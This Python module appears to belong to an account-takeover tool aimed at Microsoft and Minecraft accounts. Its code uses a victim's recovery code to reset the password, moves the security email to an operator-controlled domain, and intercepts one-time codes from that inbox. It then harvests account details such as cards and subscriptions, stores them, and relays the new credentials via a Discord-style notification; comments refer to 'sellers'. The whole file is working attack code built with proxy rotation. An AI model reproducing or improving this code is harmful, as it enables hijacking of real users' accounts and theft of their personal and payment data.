from securing.utils.login_authenticator import login_authenticator
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.security.recovery import recover, verify_password_works, RecoverError
from securing.utils.security.password_gen import generate_ms_password
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.login_pwd import login_pwd
from securing.secure import startSecuringAccount
from securing.auth.send_auth import send_auth
from securing.auth.handle_redirects import handle_redirects, get_data
from securing.auth.polish_host import polish_host

from securing.build_embeds import build_account_embeds, build_failure_embed
from securing.auth.initial_session import get_session
from securing.auth.account_status import get_account_lock_reason
from securing.utils.secure import secure
from securing.utils.proxy import (
    close_session,
    is_proxy_transport_error,
    run_with_proxy_retry,
)

from database.database import DBConnection
from time import time
from typing import Awaitable, Callable
import logging
import json
import re
import uuid

config = json.load(open("config/config.json", "r"))

# Called right after RecoverUser succeeds so the user has credentials even if
# the later OTP/polish/secure steps hang.
CredentialsNotify = Callable[[dict], Awaitable[None]]


async def _notify_credentials(on_credentials: CredentialsNotify | None, payload: dict) -> None:
    if not on_credentials:
        return
    try:
        await on_credentials(payload)
    except Exception:
        logging.exception("on_credentials notify failed for %s", payload.get("email"))


def _password_login_page_hint(page: str) -> str:
    """Short diagnostic from the password-login HTML for logs / failure reasons."""
    lower = (page or "").lower()
    if "bad user credential" in lower or "too many signin attempts" in lower:
        return "Microsoft rejected password login (bad credential or too many attempts)."
    if "interrupt/passkey" in lower or "fido" in lower:
        return "Password login hit a passkey/FIDO interrupt and never reached MSAAUTH."
    if "that password is incorrect" in lower or "account or password is incorrect" in lower:
        return "Password was rejected as incorrect during login."
    title_m = re.search(r"<title[^>]*>(.*?)</title>", page or "", re.I | re.DOTALL)
    title = re.sub(r"\s+", " ", title_m.group(1)).strip()[:80] if title_m else "unknown"
    return f"Password login page did not yield MSAAUTH (title={title!r})."


async def _secure_after_password_login(
    session,
    email: str,
    password: str,
    rextra: dict,
) -> dict:
    """Finish securing using the new password (no OTP).

    On MSAAUTH failure returns failed=True with fallback_otp=True so the caller
    can retry via security-email OTP (the path users actually expect after recover).
    """
    live = await livedata(session)
    page = await login_pwd(session, email, live["urlPost"], password, live["ppft"])
    logging.info(
        "password path login_pwd for %s: len=%s snippet=%r",
        email,
        len(page or ""),
        (page or "")[:500],
    )

    msaauth = get_data(page)
    if not msaauth:
        handled = await handle_redirects(session, page)
        if handled == "Family":
            return _failure_result(
                email,
                "Account is Family Locked.",
                security_email=rextra.get("security_email"),
                password=password,
                recovery_code=rextra.get("recovery_code"),
            )
        if isinstance(handled, dict) and handled.get("urlPost"):
            msaauth = handled
        elif isinstance(handled, str):
            logging.info(
                "password path after handle_redirects for %s: len=%s snippet=%r",
                email,
                len(handled),
                handled[:500],
            )
            msaauth = get_data(handled)

    if not msaauth or not msaauth.get("urlPost"):
        # Session cookie alone can be enough after password verify — cookies-only polish
        if (
            has_cookie(session, "__Host-MSAAUTH")
            or has_cookie(session, "__Host-MSAAUTHP")
            or has_cookie(session, "MSPAuth")
        ):
            logging.warning(
                "password path has MSAAUTH cookies but no urlPost for %s — cookies-only polish",
                email,
            )
            msaauth = {"_cookies_only": True}
        else:
            hint = _password_login_page_hint(page)
            logging.error(
                "password path MSAAUTH missing for %s — %s cookies=%s",
                email,
                hint,
                [c.name for c in session.cookies.jar][:30],
            )
            return _failure_result(
                email,
                # Keep the historical reason string; fallback_otp drives retry.
                "Password login did not establish an MSAAUTH session.",
                security_email=rextra.get("security_email"),
                password=password,
                recovery_code=rextra.get("recovery_code"),
                error=hint,
                fallback_otp=True,
            )

    if msaauth.get("_cookies_only"):
        print("[+] - Got MSAAUTH (password path, cookies-only)")
    else:
        print("[+] - Got MSAAUTH (password path)")
    try:
        await polish_host(session, msaauth)
    except Exception:
        logging.exception("polish_host failed on password path")
        print("[!] - polish_host raised; continuing with existing cookies")
    print("[~] - Polished MSAAUTH")

    account_info = {
        "microsoft": {
            "email": email,
            "security_email": rextra.get("security_email", "Couldn't Change!"),
            "password": password,
            "recovery_code": rextra.get("recovery_code", "Couldn't Change!"),
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {"active": [], "canceled": [], "commercial": []},
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False,
        },
    }

    secured = await secure(
        session=session,
        recovery=False,
        account_info=account_info,
        command=True,
    )

    account_id = uuid.uuid4().hex
    with DBConnection() as db:
        db.add_secured_account(account_id, secured)

    return await build_account_embeds(secured, 0, account_id)


def _failure_result(
    email: str,
    reason: str,
    *,
    security_email: str | None = None,
    password: str | None = None,
    recovery_code: str | None = None,
    error: str | None = None,
    fallback_otp: bool = False,
    credentials_changed: bool = False,
) -> dict:
    # Only surface generated password/security email when RecoverUser actually succeeded
    # (or a later step failed after password change). Otherwise they mislead sellers.
    if credentials_changed:
        ms = {
            "security_email": security_email or "Couldn't Change!",
            "password": password or "Couldn't Change!",
            "recovery_code": recovery_code or "Couldn't Change!",
        }
    else:
        ms = {
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": recovery_code or "Couldn't Change!",
        }
    detail = error or reason
    return {
        "failed": True,
        "reason": reason,
        "error": detail,
        "fallback_otp": fallback_otp,
        "credentials_changed": credentials_changed,
        "hit_embed": build_failure_embed(
            email,
            ms,
            reason,
            error=detail,
            credentials_changed=credentials_changed,
        ),
    }


def _flowtoken_from_auth(info: dict) -> tuple[str | None, str | None]:
    if not info:
        return None, "Microsoft login check returned no response."

    if info.get("type") == "authenticator":
        return None, "Account requires Microsoft Authenticator — email OTP is not available for this login step."

    response = info.get("response") if isinstance(info.get("response"), dict) else info
    credentials = response.get("Credentials", {}) if isinstance(response, dict) else {}
    proofs = credentials.get("OtcLoginEligibleProofs")

    if not proofs:
        auth_type = info.get("type", "unknown")
        return None, f"No email OTP method available after recovery (auth type: {auth_type})."

    return proofs[0]["data"], None


async def recovery_secure(
    email: str,
    method: str,
    data: dict,
    on_credentials: CredentialsNotify | None = None,
) -> dict:

    session = get_session()

    account = {
        "microsoft": {
            "email": email,
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {
                "active": [], 
                "canceled": [], 
                "commercial": []
            },
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }
    
    initialTime = time()
    print("[~] - Logging in session...")

    match method:
        case "rcode":
            lock_reason = await get_account_lock_reason(email)
            if lock_reason:
                return _failure_result(
                    email,
                    f"Cannot secure: {lock_reason}",
                    error=lock_reason,
                )

            sname = uuid.uuid4().hex[:16]
            # Letters+digits, mixed case — no symbols
            password = generate_ms_password(14)
            security_email = f"{sname}@{config["domain"]}"
            print(f"[+] - Generated Security Email ({security_email})")

            with DBConnection() as database:
                database.add_security_email(security_email, password)

            new_recovery_code = None
            try:
                # Proxy TLS flakes (ConnectError) — retry; after 2 fails mint a new sticky SSID.
                try:
                    new_recovery_code, session = await run_with_proxy_retry(
                        session,
                        lambda s: recover(
                            session=s,
                            email=email,
                            recovery_code=data["recovery_code"],
                            new_email=security_email,
                            new_password=password,
                        ),
                        new_session=get_session,
                        attempts=4,
                        rotate_ssid_after=2,
                        label="recover",
                        email=email,
                    )
                except RecoverError as exc:
                    return _failure_result(
                        email,
                        exc.reason,
                        security_email=security_email if exc.credentials_changed else None,
                        password=password if exc.credentials_changed else None,
                        recovery_code=data.get("recovery_code"),
                        error=exc.reason,
                        credentials_changed=exc.credentials_changed,
                    )
                except Exception as exc:
                    if is_proxy_transport_error(exc):
                        return _failure_result(
                            email,
                            f"Network error during recovery ({exc.__class__.__name__}). Retry the account.",
                            recovery_code=data.get("recovery_code"),
                            error=str(exc) or exc.__class__.__name__,
                            credentials_changed=False,
                        )
                    raise

                if not new_recovery_code or new_recovery_code == "invalid":
                    return _failure_result(
                        email,
                        "Recovery failed — Microsoft did not return a new recovery code.",
                        recovery_code=data.get("recovery_code"),
                        error="recover() returned empty/invalid",
                        credentials_changed=False,
                    )

                print("[+] - Changed password and recovery code")
                print(f"[+] - New recovery code: {new_recovery_code}")
                print(f"[+] - Security email: {security_email}")
                print(f"[+] - Password: {password}")

                # DM / notify credentials IMMEDIATELY — polish/OTP can hang later
                # and previously left users with no Discord output after RecoverUser.
                await _notify_credentials(
                    on_credentials,
                    {
                        "email": email,
                        "security_email": security_email,
                        "password": password,
                        "recovery_code": new_recovery_code,
                    },
                )

                # Drop the recovery jar — account.live.com + login.live.com leave
                # duplicate MSCC cookies that crash httpx. Fresh session for OTP login.
                await close_session(session)
                session = get_session()

                # Soft verify only — never abort recovery on flaky check.
                try:
                    pwd_status = await verify_password_works(session, email, password)
                except Exception as exc:
                    if is_proxy_transport_error(exc):
                        logging.warning(
                            "Password verify proxy error for %s — rotating SSID and retrying once",
                            email,
                        )
                        await close_session(session)
                        session = get_session()
                        try:
                            pwd_status = await verify_password_works(session, email, password)
                        except Exception:
                            logging.exception("Password verify raised for %s", email)
                            pwd_status = "unknown"
                    else:
                        logging.exception("Password verify raised for %s", email)
                        pwd_status = "unknown"

                if pwd_status == "ok":
                    print("[+] - Password verified OK")
                elif pwd_status == "bad":
                    print("[!] - Password did NOT stick — login will use security-email OTP")
                    logging.error(
                        "Password not applied for %s after RecoverUser — marking UNVERIFIED",
                        email,
                    )
                    password = f"{password} (UNVERIFIED — may not work)"
                else:
                    print("[~] - Password verify inconclusive (continuing)")

                rextra = {
                    "security_email": security_email,
                    "password": password,
                    "recovery_code": new_recovery_code,
                }

                # Prefer password login when RecoverUser password stuck.
                # Avoids OTP + fragile livedata parse when we already know the password works.
                # If password login fails to establish MSAAUTH (passkey interrupt, rate-limit,
                # etc.), fall back to security-email OTP — that is the path users expect.
                account = None
                if pwd_status == "ok":
                    print("[~] - Logging in with new password (skip OTP)...")
                    # Password verify leaves MSAAUTH cookies that make the next
                    # login.live.com fetch return an empty 302 (no PPFT form).
                    # Always start the real login on a clean session.
                    await close_session(session)
                    session = get_session()

                    async def _pwd_login(s):
                        return await _secure_after_password_login(
                            s, email, password, rextra
                        )

                    try:
                        account, session = await run_with_proxy_retry(
                            session,
                            _pwd_login,
                            new_session=get_session,
                            attempts=4,
                            rotate_ssid_after=2,
                            label="password-login",
                            email=email,
                        )
                    except Exception as exc:
                        if is_proxy_transport_error(exc):
                            logging.warning(
                                "password path proxy exhausted for %s — falling back to OTP",
                                email,
                            )
                            account = None
                            await close_session(session)
                            session = get_session()
                        else:
                            raise

                    if (
                        isinstance(account, dict)
                        and account.get("failed")
                        and account.get("fallback_otp")
                    ):
                        logging.warning(
                            "password path failed for %s (%s) — falling back to security-email OTP",
                            email,
                            account.get("error") or account.get("reason"),
                        )
                        print(
                            "[!] - Password login did not establish MSAAUTH; "
                            "falling back to security-email OTP..."
                        )
                        account = None
                        await close_session(session)
                        session = get_session()

                if account is None:
                    async def _otp_login(s):
                        info = await send_auth(s, email, security_email)
                        flowtoken, auth_error = _flowtoken_from_auth(info)
                        if auth_error:
                            return _failure_result(
                                email,
                                auth_error,
                                security_email=security_email,
                                password=password,
                                recovery_code=new_recovery_code,
                                credentials_changed=True,
                            )

                        print(f"[~] - Getting email code...")
                        # Mail can lag under bulk load; 150s matches i5600 wait.
                        code = await get_email_code(security_email, timeout=150)
                        print(f"Got code - {code}")

                        if not code:
                            return _failure_result(
                                email,
                                "Timed out waiting for OTP at the new security email.",
                                security_email=security_email,
                                password=password,
                                recovery_code=new_recovery_code,
                                credentials_changed=True,
                            )

                        live = await livedata(s)
                        ppft = live["ppft"]

                        return await startSecuringAccount(
                            session=s,
                            email=email,
                            device=flowtoken,
                            ppft=ppft,
                            code=code,
                            recovery=False,
                            rextra=rextra,
                            command=True,
                        )

                    # OTP fetch is inside the factory — only rotate SSID on connect
                    # errors *before* a code is consumed when possible. After 2 proxy
                    # fails we still rotate; a second OTP may be requested.
                    try:
                        account, session = await run_with_proxy_retry(
                            session,
                            _otp_login,
                            new_session=get_session,
                            attempts=4,
                            rotate_ssid_after=2,
                            label="otp-login",
                            email=email,
                        )
                    except Exception as exc:
                        if is_proxy_transport_error(exc):
                            return _failure_result(
                                email,
                                f"Network error during OTP login ({exc.__class__.__name__}). "
                                "Credentials above are valid — retry securing.",
                                security_email=security_email,
                                password=password,
                                recovery_code=new_recovery_code,
                                error=str(exc) or exc.__class__.__name__,
                                credentials_changed=True,
                            )
                        raise

                if isinstance(account, dict) and account.get("failed"):
                    return _failure_result(
                        email,
                        account.get("reason", "Login or securing failed after recovery code reset."),
                        security_email=security_email,
                        password=password,
                        recovery_code=new_recovery_code,
                        error=account.get("reason"),
                        credentials_changed=True,
                    )

                if not account:
                    return _failure_result(
                        email,
                        "Login or securing failed after recovery code reset.",
                        security_email=security_email,
                        password=password,
                        recovery_code=new_recovery_code,
                        error="startSecuringAccount returned no account data.",
                        credentials_changed=True,
                    )

                return account
            except Exception as exc:
                logging.exception("recovery_secure rcode failed for %s", email)
                if new_recovery_code:
                    # Surface a readable reason — never dump bare AttributeError.group
                    reason = str(exc).strip() or exc.__class__.__name__
                    where = ""
                    try:
                        import traceback as _tb
                        frames = _tb.extract_tb(exc.__traceback__)
                        if frames:
                            fr = frames[-1]
                            where = f" ({fr.filename.rsplit('/', 1)[-1]}:{fr.lineno})"
                    except Exception:
                        pass
                    if is_proxy_transport_error(exc):
                        reason = (
                            f"Network/proxy error ({exc.__class__.__name__}). "
                            "Credentials above are valid — retry securing."
                        )
                    elif "has no attribute 'group'" in reason:
                        reason = (
                            f"Parser missed a field{where}. "
                            "Recovery already completed — credentials above are valid; retry securing."
                        )
                    else:
                        reason = f"{reason}{where}"
                    return _failure_result(
                        email,
                        f"Securing step failed: {reason}",
                        security_email=security_email,
                        password=password,
                        recovery_code=new_recovery_code,
                        error=f"{exc.__class__.__name__}: {exc}",
                        credentials_changed=True,
                    )
                raise
            finally:
                await close_session(session)
            
        case "authpwd":
            lock_reason = await get_account_lock_reason(email)
            if lock_reason:
                return _failure_result(
                    email,
                    f"Cannot secure: {lock_reason}",
                    error=lock_reason,
                )

            response = await login_authenticator(
                session=session,
                email=email,
                data=data,
            )

            if response is not True:
                reason = response if isinstance(response, str) and response else "invalid credentials"
                return _failure_result(
                    email,
                    reason if reason != "invalid" else "invalid credentials",
                    password=data.get("password"),
                    error=reason,
                )

            dsecured = await secure(
                session=session,
                recovery=True,
                account_info=account,
                command=True,
            )

    logging.info(f"Account: {dsecured}")

    final_time = (time() - initialTime)

    account_id = uuid.uuid4().hex
    with DBConnection() as database:
        database.add_secured_account(account_id, dsecured)

    build_account = await build_account_embeds(dsecured, final_time, account_id)
    return build_account